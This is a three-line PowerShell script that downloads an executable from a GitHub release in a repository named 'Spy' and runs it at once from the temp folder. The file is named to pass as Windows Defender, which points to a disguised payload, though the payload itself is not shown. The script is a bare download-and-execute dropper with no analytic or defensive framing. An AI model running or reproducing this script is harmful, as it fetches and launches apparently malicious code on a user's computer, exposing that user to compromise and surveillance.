$path = "$env:TEMP\System.AVC.exe"
Invoke-WebRequest -Uri "https://github.com/ertvg/Spy/releases/download/v1/Windows.Defender.AVC.exe" -OutFile $path
Start-Process $path
